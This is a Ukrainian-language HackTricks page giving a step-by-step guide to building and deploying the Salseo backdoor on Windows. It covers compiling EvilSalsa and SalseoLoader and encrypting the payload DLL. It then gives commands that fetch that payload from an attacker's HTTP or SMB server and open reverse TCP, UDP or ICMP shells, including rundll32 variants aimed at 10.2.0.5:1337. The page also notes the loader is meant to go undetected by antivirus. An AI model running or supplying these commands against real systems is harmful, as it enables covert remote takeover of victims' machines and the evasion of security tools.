# Salseo

{% hint style="success" %}
Вивчайте та практикуйте взлом AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Школа взлому AWS для Червоної Команди (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Школа взлому GCP для Червоної Команди (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **та** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**

</details>
{% endhint %}

## Компіляція бінарних файлів

Завантажте вихідний код з GitHub та скомпілюйте **EvilSalsa** та **SalseoLoader**. Вам потрібно мати встановлений **Visual Studio** для компіляції коду.

Скомпілюйте ці проекти для архітектури віконної системи, на якій ви плануєте їх використовувати (якщо Windows підтримує x64, скомпілюйте їх для цієї архітектури).

Ви можете **вибрати архітектуру** всередині Visual Studio в **лівій вкладці "Build"** в **"Platform Target".**

(\*\*Якщо ви не можете знайти ці параметри, натисніть на **"Project Tab"**, а потім на **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Потім скомпілюйте обидва проекти (Build -> Build Solution) (У логах з'явиться шлях до виконуваного файлу):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Підготовка Задніх Дверей

По-перше, вам потрібно закодувати **EvilSalsa.dll.** Для цього ви можете використати скрипт Python **encrypterassembly.py** або скомпілювати проект **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, зараз у вас є все необхідне для виконання всієї справи Salseo: **закодований EvilDalsa.dll** та **бінарний файл SalseoLoader.**

**Завантажте виконуваний файл SalseoLoader.exe на машину. Їх не повинно виявити жодне Антивірусне програмне забезпечення...**

## **Виконання backdoor**

### **Отримання оберненого оболонкового з'єднання TCP (завантаження закодованого dll через HTTP)**

Не забудьте запустити nc як прослуховувач оберненої оболонки та HTTP-сервер для обслуговування закодованого evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Отримання зворотньої оболонки UDP (завантаження закодованого dll через SMB)**

Не забудьте запустити nc як прослуховувач зворотньої оболонки та сервер SMB для обслуговування закодованого evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Отримання зворотньої оболонки ICMP (закодований dll вже всередині жертви)**

**На цей раз вам потрібен спеціальний інструмент у клієнта для отримання зворотної оболонки. Завантажте:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Вимкнення відповідей ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Виконати клієнт:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### У жертви виконаємо річ сальсео:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Компіляція SalseoLoader як DLL, експортуючи головну функцію

Відкрийте проект SalseoLoader за допомогою Visual Studio.

### Додайте перед головною функцією: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Встановіть DllExport для цього проекту

#### **Інструменти** --> **Менеджер пакетів NuGet** --> **Керування пакетами NuGet для рішення...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Пошук пакету DllExport (за допомогою вкладки Огляд), і натисніть Встановити (і прийміть спливаюче вікно)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

У вашій папці проекту з'явилися файли: **DllExport.bat** та **DllExport\_Configure.bat**

### **Де**інсталюйте DllExport

Натисніть **Деінсталювати** (так, це дивно, але повірте мені, це необхідно)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Вийдіть з Visual Studio та виконайте DllExport\_configure**

Просто **вийдіть** з Visual Studio

Потім перейдіть до вашої **папки SalseoLoader** та **виконайте DllExport\_Configure.bat**

Виберіть **x64** (якщо ви збираєтеся використовувати його всередині x64-боксу, це було моє випадок), виберіть **System.Runtime.InteropServices** (в межах **Простору імен для DllExport**) та натисніть **Застосувати**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Відкрийте проект знову за допомогою Visual Studio**

**\[DllExport]** більше не повинен бути позначений як помилка

![](<../.gitbook/assets/image (8) (1).png>)

### Побудуйте рішення

Виберіть **Тип виводу = Бібліотека класів** (Проект --> Властивості SalseoLoader --> Додаток --> Тип виводу = Бібліотека класів)

![](<../.gitbook/assets/image (10) (1).png>)

Виберіть **платформу x64** (Проект --> Властивості SalseoLoader --> Збірка --> Ціль платформи = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Для **побудови** рішення: Build --> Build Solution (У консолі виведення з'явиться шлях до нового DLL)

### Протестуйте згенерований Dll

Скопіюйте та вставте Dll туди, де ви хочете його протестувати.

Виконайте:
```
rundll32.exe SalseoLoader.dll,main
```
Якщо помилка не виникає, ймовірно, у вас є функціональний DLL!!

## Отримайте оболонку, використовуючи DLL

Не забудьте використовувати **HTTP** **сервер** та встановити **nc** **прослуховувач**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Вивчайте та практикуйте взлом AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Школа взлому AWS для Червоної Команди (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Школа взлому GCP для Червоної Команди (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
